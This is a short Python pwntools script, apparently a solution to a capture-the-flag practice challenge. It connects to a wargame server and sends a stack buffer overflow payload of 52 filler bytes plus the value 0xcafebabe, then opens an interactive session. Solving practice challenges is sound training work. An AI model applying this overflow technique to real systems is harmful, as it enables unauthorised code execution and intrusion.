from pwn import *

p = remote('pwnable.kr',10003)

payload = b'A'*52 + p32(0xcafebabe)
print(payload)

p.sendline(payload)

p.interactive()